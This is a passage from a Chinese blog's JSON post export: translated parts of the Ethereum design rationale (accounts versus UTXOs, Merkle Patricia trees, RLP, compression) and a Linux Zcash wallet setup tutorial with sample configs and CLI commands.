议的决定，以及显示我们的方法和可能的替代方案所涉及的风险。 原则以太坊协议的设计过程遵循了下列原则： 三明治复杂模型：我们相信以太坊结构的底层应该尽可能的简单，并且与以太坊的交互接口（包括开发者使用的高级编程语言以及用户的使用界面）应该尽可能的易懂。在复杂性不可避免的情况下，它应该被推入协议的“中间层”，它们不是核心共识的一部分，但也不被终端用户看到，如高级语言编译器，参数序列化和反序列化脚本，存储 数据结构模型，leveldb存储接口和有线协议等。但是，这种偏好并不是绝对的。 自由：用户在使用以太坊协议的时候不应该被限制，我们也不应该试图去表示喜欢或者不喜欢他们基于某种目的而使用的以太坊合约或者交易。这类似于和“网络中立”背后的指导原则。一个没有遵循此原则的例子是比特币交易协议中的情况，它不鼓励使用区块链来做“非标签”（如数据存储，元协议）目的的行为，并且在某些情况下明确了对准协议的改变（如 OP_RETURN 限制为 40 字节），试图以“未授权”方式使用区块链来攻击应用。在 Ethereum 中，我们强烈支持设置交易费用，这样大致上就会具有激励作用，这样，使用区块链的用户会以膨胀（bloat-producing）的方式内部化其活动成本（即 Pigovian 税）。 概念：以太坊中的协议特征和操作码应该体现最低级别的概念，以便可以以任意的方式进行组合，包括今天可能看起来不太有用但以后可能会变得有用的方法，然后当这些概念对于使用了这些概念的功能来说不再必要的时候，就可以通过剥离它们来提升效率。遵循这个原则的一个例子是我们选择 LOG 操作码作为向（特别是轻客户端）dapps 提供信息的一种方式，而不是像之前建议的那样在内部简单地记录所有事务和消息 - “消息”的概念是包括“方法调用”和“外部观察者感兴趣的事件”在内的多个概念的聚集，理应分离这两个概念。 我们没有特征：作为泛化的必然结果，我们常常拒绝将十分常见的高级使用示例作为协议的一部分，我们认为如果人们真的需要做一件事情，那么他可以在一个合约内部创建一个子协议。一个例子是以太坊中缺少与比特币中一样“锁定时间”的功能，因为这样的功能可以通过用户发送“签名数据包”协议来模拟，然后这些数据包可以被输入到专门的合同中处理，并且如果数据包符合合同的一些条件，就会触发相应的功能。 非风险规避：如果风险增加的变化提供了非常可观的收益（例如，广义的状态转换，50倍的更快的阻塞时间，共识效率等），那么我们可以承受更高的风险程度。 这些原则在规定以太坊开发中都涉及到，但它们并不是绝对的，在某些情况下，为了减少开发时间或者避免一次性尝试太多激进的东西，我们会推迟某些明显有利的变革，以便将来发行（如以太坊1.1）。 区块链层次的协议这部分描述了以太坊中对区块链层次协议所做的一些改变，包括了区块和交易是如何工作的，数据是如何序列化和存储的，以及账户背后的机制。 账户和非 UTXOs比特币，以及许多由它衍生而来的系统，将用户的资产数据存储在一个基于 unspent transaction outputs(UTXOs) 的结构中：整个系统的状态由一系列未花费输出（联想成“币”）组成，所以每个币都有一个主人和面值，而一笔交易可以花费一个或更多的币并且创建一个或更多的币，有效性的约束有： 每一个被引用的输入必须是合法的并且没有被花费过 交易中的每一个输入都必须有一个符合该输入的主人的签名 所有的输入必须大于等于所有的输出 因此，系统中用户的“余额”是用户具有能够产生有效签名的私钥的一组硬币的总值。 (图片来自 https://bitcoin.org/en/developer-guide) 以太坊抛弃这个方案，转而采用更简单的方法：使用状态存储一个账户列表，其中每个账户都有一个余额，以及以太坊特定的数据（代码和内部存储）。一笔交易会在发送账户有足够的余额支付的情况下生效，此时，发送账户减少余额，收款账户增加余额。如果接收账户有代码，代码会运行，而内部存储也可能被更改，或者代码甚至可能会创建额外的消息给其他账户，从而导致进一步的余额变更。 UTXOs 的好处： 高度的隐私性：如果用户接受每笔交易的时候都使用一个新地址，那么就很难将账户连接起来。这很适用于货币，但是对任意 dapps 就不是那么合适了，因为 dapps 常常需要对用户的一系列复杂的状态保持跟踪，并且可能不存在像货币那样简单的用户状态分区方案。 潜在的可扩展性范例：UTXO 在理论上更与某些可扩展性模式相兼容，因为我们只能依靠一些拥有 Merkle 所有权证明的币的所有者，即使包括所有者在内的每个人都决定忘记这些数据，只有所有者受到损害( and even if everyone including the owner decides to forget that data then only the owner is harmed)。 在一个账户范例中，一旦某个人失去其账户对应的部分 Merkle 树，将使得不可能以任何方式处理该账户相关的消息，包括发送给它。 但是，非 UTXO 依赖的可伸缩性范例确实存在。 账户的好处： 节省了大量空间：例如，如果一个账户有 5 个 UTXO，然后将一个 UTXO 模型转换成账户模型，它的空间要求就会从 （20 + 32 + 8）* 5 = 300 bytes(20 是地址，32 是 txid，8 是值)减少到 20 + 8 + 2 = 30 bytes(20 是地址，8 是值，2 是 nonce)。实际上，要求的存储空间没有这么大，因为账户需要存储在 Patricia 树中（见下文），但是它们仍然很大。（In reality savings are not nearly this massive because accounts need to be stored in a Patricia tree (see below) but they are nevertheless large. ）另外，交易可以更小（如以太坊中需要 100 bytes 而比特币中需要 200 - 250 bytes），因为每笔交易只需要使用一个引用，一个签名以及一个输出。 更好的可替代性：因为没有区块链层次的特定币来源的概念，所以从技术上和法律上来说，建立一个红名单/黑名单方案并根据它们的来源来区分币就很不现实。 简单：编码简单易懂，特别是涉及到复杂脚本的时候。虽然也可以强制使用 UTXO 模型来实现 dapp，但本质上是通过赋予脚本能力，来限制给定的 UTXO 可以以哪种 UTXO 类型来花费，并且需要花费包括根据脚本评估的 Merkle 树中的应用程序状态改变的证明的 Merkle 树的根（and requiring spends to include Merkle tree proofs of change-of-application-state-root that scripts evaluate），这样的范例比使用帐户更加复杂和难看。 持久的轻客户端引用：轻客户端可以在任何时候通过定向扫描一棵状态树来访问一个账户相关的所有数据。在 UTXO 模型中，每笔交易都会改变引用，这对于试图使用上面提到的 UTXO 状态传播机制的长期运行的 dapps 来说，这是一个特别麻烦的问题。 我们已经做好了决定，因为对于我们正在处理的包含任意状态和代码的 dapps 来说，帐户模型远比其他要好。 此外，本着“我们没有特征”原则的精神，我们认为，如果人们确实关心隐私，那么可以通过合同内的签名数据包协议来建立混淆器（mixer）和组合币（coinjoin）。 账户模型的一个缺点是，为了防止重放攻击，每笔交易都必须有一个 nonce 值，这样账户就可以对使用的 nonce 进行跟踪，并且只接受当前 nonce 值比之前的 nonce 值多 1 的交易。这意味着即使是废弃的账号也不会删除账号状态。解决这个问题的一个简单方法是要求每笔交易都包含一个区块号，使得它们在一段时期之后就不能够被重放，并且在每个时期都重置一次 nonce。矿工或者其他用户会对账户进行 ping 操作，然后删除状态中的未使用账户，因为作为区块链协议的一部分，进行全部扫描的代价太高了。我们没有用这个机制只是为了加快 1.0 的发展; 1.1 及以后可能会使用这样一个系统。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"ethereum","slug":"ethereum","permalink":"http://xingyunbite.github.com/tags/ethereum/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"以太坊wiki-设计原理翻译二","slug":"以太坊wiki-设计原理翻译二","date":"2018-02-08T18:10:31.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/02/09/以太坊wiki-设计原理翻译二/","link":"","permalink":"http://xingyunbite.github.com/2018/02/09/以太坊wiki-设计原理翻译二/","excerpt":"","text":"以太坊wiki-设计原理翻译一 默克尔帕夏里克树默克尔帕夏里克树（Merkle Patricia tree/trie），以前由 Alan Reiner 设想并在 Ripple 协议中实现，是以太坊中的基本数据结构，被用来存储所有的账户状态，以及区块中的交易和收据。MPT 是 Merkle tree 和 Patricia tree 的结合，以两者的元素来创建具有以下两个属性的结构： 每一组唯一的键/值对唯一地映射到一个根散列，并且不可能欺骗一棵树中的键/值对的成员（除非攻击者具有〜2 ^ 128 的计算能力） 在对数时间内进行修改，添加和删除键值对。 这为我们提供了一种高效、更新容易的方法，来对我们整个状态树进行“指纹”操作。以太坊 MPT 的正式描述如下：https://github.com/ethereum/wiki/wiki/Patricia-Tree MPT 中详细的设计决定包括： 拥有两种节点类别：kv 节点和分叉节点（从 MPT 详解中获得更多信息）。kv 节点的存在提高了效率，因为如果一棵树在特定区域稀疏，kv 节点就可以作为“快捷方式”，从而不需要深度为 64 的树。 使分叉节点为 6 而不是 2：这是为了提升查找效率。我们现在认识到这个选择并不理想，因为可以通过存储批量节点，以二进制模式模拟六叉树的查找效率。然而，由于树结构在实现中很容易出现错误，而导致根不匹配，所以我们决定把它推迟到 1.1。 空值和“没有成员”之间没有区别：这是为了简单起见，并且因为以太坊的默认值通常意味着零（如 余额（balance）），而且空字符串被用来表示零，所以实际运行起来也没有任何问题。 终止和非终止节点之间的区别：从技术上讲，“这个节点终止”标志是不必要的，因为以太坊中的所有树都用来存储静态键长度，但是为了增加通用性，我们添加了它，并且希望其他加密协议也能够使用以太坊中 MPT 的实现方式。 使用 sha3(k) 作为 “安全树（secure tree）” 中的键（在状态和账户存储中使用）：这会使得「通过设置一个分叉了 64 层级深的节点的最大不利链，然后在这上面不断调用 SLOAD 和 SSTORE」这样的方式，对树进行 DoS 攻击会十分困难。同时请注意，这将使枚举树更加困难。 如果你想在你的客户端拥有枚举功能，最简单的方法是维护一个数据库映射 sha3（k） - &gt; k。 RLPRLP（递归长度前缀）编码是以太坊中使用的主要序列化格式，并且被使用于任何地方 - 区块，交易，账户状态和信息传递协议。RLP 的正式描述如下：https://github.com/ethereum/wiki/wiki/RLP RLP 旨在成为高度简约的序列化格式，它唯一的目的是存储嵌套的字节数组。不像 protobuf，BSON 和其他解决方式，RLP 并不想定义任何具体的数据类型，如 booleans, floats, doubles 或者 integers，相反，它只是以嵌套数组的形式存储结构，并将其留给协议来确定数组的含义。键/值映射也不被明确支持; 支持键/值映射的半官方建议是将这些映射表示为[[k1，v1]，[k2，v2]，...]，其中 k1，k2 ... 使用字符串的标准排序来排序。 RLP 的备选方案可以使用已经存在的算法如 protobuf 或者 BSON，但我们更青睐 RLP 的原因是：(1) 实现方式简单。（2）保证绝对的字节完美一致性。许多语言中的键/值映射没有明确的顺序，浮点格式有许多特殊情况，这可能导致相同的数据使用不同的编码，因此产生不同的哈希。我们可以内部开发一个协议来确定解决这些问题（这是一个普遍的原则，也适用于代码的其他部分，例如 VM）。注意 BitTorrent 使用的 bencode，可能为 RLP 提供了一个可行的替代方案，尽管其使用十进制编码的长度使得它与二进制 RLP 相比稍微不太理想。 压缩算法有线协议和数据库都使用了定制的压缩算法来存储数据。该算法最好的描述为运行长度编码零（run-length-encoding zeroes），并保留其他值，除了像 sha3（&#39;&#39;） 这样的常见值的一些特殊情况例外。例如： 1234567&gt;&gt;&gt; compress(&apos;horse&apos;)&apos;horse&apos;&gt;&gt;&gt; compress(&apos;donkey dragon 1231231243&apos;)&apos;donkey dragon 1231231243&apos;&gt;&gt;&gt; compress(&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;)&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\xfe\\x9e\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;&gt;&gt;&gt; compress(&quot;\\xc5\\xd2F\\x01\\x86\\xf7#&lt;\\x92~&#125;\\xb2\\xdc\\xc7\\x03\\xc0\\xe5\\x00\\xb6S\\xca\\x82&apos;;&#123;\\xfa\\xd8\\x04]\\x85\\xa4p&quot;)&apos;\\xfe\\x01&apos; 在压缩算法出现之前，以太坊协议中的很多部分都有大量的特殊情况。比如，sha3 常常被覆盖，这样 sha3(&#39;&#39;)=&#39;&#39;，从而无需存储代码或者在账户中存储，由此会节省 64 个字节。但是，最近所有的这些特殊情况都被移除了 - 这使得以太坊数据结构在默认情况下变得非常庞大，取而代之的是将数据保存功能添加到区块链协议层之外的层级，添加方式是将其利用有线协议无缝插入用户的数据库实现。 这增加了模块性，简化了共识层，并且还允许相对容易地部署压缩算法的升级（例如，通过网络协议版本）。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"ethereum","slug":"ethereum","permalink":"http://xingyunbite.github.com/tags/ethereum/"},{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/tags/区块链/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"linux下Zcash钱包使用教程","slug":"linux下Zcash钱包使用教程","date":"2018-02-08T11:04:15.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/02/08/linux下Zcash钱包使用教程/","link":"","permalink":"http://xingyunbite.github.com/2018/02/08/linux下Zcash钱包使用教程/","excerpt":"","text":"Zcash (ZEC)是首个使用零知识证明机制的区块链系统，它可提供完全的支付保密性，同时仍能够使用公有区块链来维护一个去中心化网络。与比特币相同的是，Zcash代币（ZEC）的总量也是2100万，不同之处在于，Zcash交易自动隐藏区块链上所有交易的发送者、接受者及数额。只用那些拥有查看秘钥的人才能看到交易的内容。用户拥有完全的控制权，他们可自行选择向其他人提供查看秘钥. ZCash 是 bitcoin 的分支，保留了 bitcoin 原有的模式，基于比特币 0.11.2 版代码修改的。 ZCash 钱包资金分 2 种：透明资金、私有资金，透明资金类似比特币资金；私有资金加强了 隐私性，涉及到私有资金的交易是保密不可查的，透明资金与透明资金的交易是公开可查的. 目前Zcash流通市值在12亿美元左右，每日交易额也高达1亿美元，其使用zero-knowledge proof（零知识证明）使得数字化货币更加具有安全性；隐私性而备受市场关注。 现在zcash官方提供的钱包是linux版本的，而原因是zcash团队没人熟悉gui，不过zcash官方提供了编译后的可执行程序，这里也不用我们来进行编译了。 下载地址 ： https://z.cash/downloads/zcash-1.0.14-linux64.tar.gzhash : 352ea2a67ae3484046a6bd43af9a5ce125e2d103a6a32ac71805658918f7076a 下载后请务必进行哈希值验证，以保证文件的真实和准确性。 tar -xvf zcash-1.0.14-linux64.tar.gz //解压缩mv -t /usr/local/bin/ zcash-1.0.14/bin/* //移动可执行文件 现在我们已经安装了zcash，运行下面的命令下载 key ，用于创建和验证参数。 zcash-fetch-params 这里由于国内网络的原因，可能会失败，请多试几次。 验证通过后，我们需要对客户端进行配置。 mkdir ~/.zcash //创建zcash目录 vim zcash.conf 以上按照个人配置的不同，设置不同的配置文件，下面提供一个配置供参考。 //这是测试链接的配置 addnode=testnet.z.cash //节点 rpcuser=test //rpc用户名 rpcpassword=test //rpc密码 gen=0 //屏蔽cpu挖矿 testnet=1 //开启测试链 rpcallowip=100.100.60.10 //允许访问的IP rpcport=8333 //rpc端口号 equihashsolver=tromp //指定算法，非挖矿钱包可以删除 好了，保存后输入zcashd就可以启动zcash客户端了，也可以使用zcashd -daemon在后台运行zcash客户端,在shell输入zcash-cli getinfo命令就可以看到网络和块信息了。 下面提供一些zcash节点常用命令： zcash-cli getinfo //显示节点信息 zcashd -daemon //后台启动zcash守护 zcash-cli getnetworkhashps //获取全网算力 zcash-cli z_getnewaddress //生成一个Z-addr zcash-cli getnewaddress //生成一个t-addr zcas-cli getblockhash //区块高度 zcash-cli getaddressesbyaccount &quot;&quot; //显示所有t-addr钱包 zcash-cli z_listaddresses //显示所有Z-addr钱包 zcash-cli z_getbalance &quot;&quot; //z钱包余额 如果有其他的需要，可以使用zcash-cli help来查看zcash的全部命令。 附1： zcash钱包配置： //这里是zcash钱包主链配置 rpcuser=rpc用户名 rpcpassword=rpc密码 rpcport=rpc端口 rpcallowip=允许链接rpc ip地址 server=1 //打开服务 daemon=1 //后台运行守护 mainnet=1 //主链 addnode=mainnet.z.cash //主链节点 附2： //zcash命令 == Blockchain == getbestblockhash getblock &quot;hash|height&quot; ( verbose ) getblockchaininfo getblockcount getblockhash index getblockheader &quot;hash&quot; ( verbose ) getchaintips getdifficultygetmempoolinfogetrawmempool ( verbose ) gettxout “txid” n ( includemempool ) gettxoutproof [“txid”,…] ( blockhash ) gettxoutsetinfo verifychain ( checklevel numblocks ) verifytxoutproof “proof” == Control == getinfo help ( &quot;command&quot; ) stop == Disclosure == z_getpaymentdisclosure &quot;txid&quot; &quot;js_index&quot; &quot;output_index&quot; (&quot;message&quot;) z_validatepaymentdisclosure &quot;paymentdisclosure&quot; == Generating == generate numblocks getgenerate setgenerate generate ( genproclimit ) == Mining == getblocksubsidy height getblocktemplate ( &quot;jsonrequestobject&quot; ) getlocalsolps getmininginfo getnetworkhashps ( blocks height ) getnetworksolps ( blocks height ) prioritisetransaction &lt;txid&gt; &lt;priority delta&gt; &lt;fee delta&gt; submitblock &quot;hexdata&quot; ( &quot;jsonparametersobject&quot; ) == Network == addnode &quot;node&quot; &quot;add|remove|onetry&quot; clearbanned disconnectnode &quot;node&quot; getaddednodeinfo dns ( &quot;node&quot; ) getconnectioncount getnettotals getnetworkinfo getpeerinfo listbanned ping setban &quot;ip(/netmask)&quot; &quot;add|remove&quot; (bantime) (absolute) == Rawtransactions == createrawtransaction [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n},...] {&quot;address&quot;:amount,...} decoderawtransaction &quot;hexstring&quot; decodescript &quot;hex&quot; fundrawtransaction &quot;hexstring&quot; getrawtransaction &quot;txid&quot; ( verbose ) sendrawtransaction &quot;hexstring&quot; ( allowhighfees ) signrawtransaction &quot;hexstring&quot; ( [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n,&quot;scriptPubKey&quot;:&quot;hex&quot;,&quot;redeemScript&quot;:&quot;hex&quot;},...] [&quot;privatekey1&quot;,...] sighashtype ) == Util == createmultisig nrequired [&quot;key&quot;,...] estimatefee nblocks estimatepriority nblocks validateaddress &quot;zcashaddress&quot; verifymessage &quot;zcashaddress&quot; &quot;signature&quot; &quot;message&quot; z_validateaddress &quot;zaddr&quot; == Wallet == addmultisigaddress nrequired [&quot;key&quot;,...] ( &quot;account&quot; ) backupwallet &quot;destination&quot; dumpprivkey &quot;zcashaddress&quot; dumpwallet &quot;filename&quot; encryptwallet &quot;passphrase&quot; getaccount &quot;zcashaddress&quot; getaccountaddress &quot;account&quot; getaddressesbyaccount &quot;account&quot; getbalance ( &quot;account&quot; minconf includeWatchonly ) getnewaddress ( &quot;account&quot; ) getrawchangeaddress getreceivedbyaccount &quot;account&quot; ( minconf ) getreceivedbyaddress &quot;zcashaddress&quot; ( minconf ) gettransaction &quot;txid&quot; ( includeWatchonly ) getunconfirmedbalance getwalletinfo importaddress &quot;address&quot; ( &quot;label&quot; rescan ) importprivkey &quot;zcashprivkey&quot; ( &quot;label&quot; rescan ) importwallet &quot;filename&quot; keypoolrefill ( newsize ) listaccounts ( minconf includeWatchonly) listaddressgroupings listlockunspent listreceivedbyaccount ( minconf includeempty includeWatchonly) listreceivedbyaddress ( minconf includeempty includeWatchonly) listsinceblock ( &quot;blockhash&quot; target-confirmations includeWatchonly) listtransactions ( &quot;account&quot; count from includeWatchonly) listunspent ( minconf maxconf [&quot;address&quot;,...] ) lockunspent unlock [{&quot;txid&quot;:&quot;txid&quot;,&quot;vout&quot;:n},...] move &quot;fromaccount&quot; &quot;toaccount&quot; amount ( minconf &quot;comment&quot; ) sendfrom &quot;fromaccount&quot; &quot;tozcashaddress&quot; amount ( minconf &quot;comment&quot; &quot;comment-to&quot; ) sendmany &quot;fromaccount&quot; {&quot;address&quot;:amount,...} ( minconf &quot;comment&quot; [&quot;address&quot;,...] ) sendtoaddress &quot;zcashaddress&quot; amount ( &quot;comment&quot; &quot;comment-to&quot; subtractfeefromamount ) setaccount &quot;zcashaddress&quot; &quot;account&quot; settxfee amount signmessage &quot;zcashaddress&quot; &quot;message&quot; z_exportkey &quot;zaddr&quot; z_exportviewingkey &quot;zaddr&quot; z_exportwallet &quot;filename&quot; z_getbalance &quot;address&quot; ( minconf ) z_getnewaddress z_getoperationresult ([&quot;operationid&quot;, ... ]) z_getoperationstatus ([&quot;operationid&quot;, ... ]) z_gettotalbalance ( minconf includeWatchonly ) z_importkey &quot;zkey&quot; ( rescan startHeight ) z_importviewingkey &quot;vkey&quot; ( rescan startHeight ) z_importwallet &quot;filename&quot; z_listaddresses ( includeWatchonly ) z_listoperationids z_listreceivedbyaddress &quot;address&quot; ( minconf ) z_sendmany &quot;fromaddress&quot; [{&quot;address&quot;:... ,&quot;amount&quot;:...},...] ( minconf ) ( fee ) z_shieldcoinbase &quot;fromaddress&quot; &quot;tozaddress&quot; ( fee ) ( limit ) zcbenchmark benchmarktype samplecount zcrawjoinsplit rawtx inputs outputs vpub_old vpub_new zcrawkeygen zcrawreceive zcsecretkey encryptednote zcsamplejoinsplit","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"lucas556","slug":"lucas556","permalink":"http://xingyunbite.github.com/tags/lucas556/"},{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"zcash","slug":"zcash","permalink":"http://xingyunbite.github.com/tags/zcash/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]}]}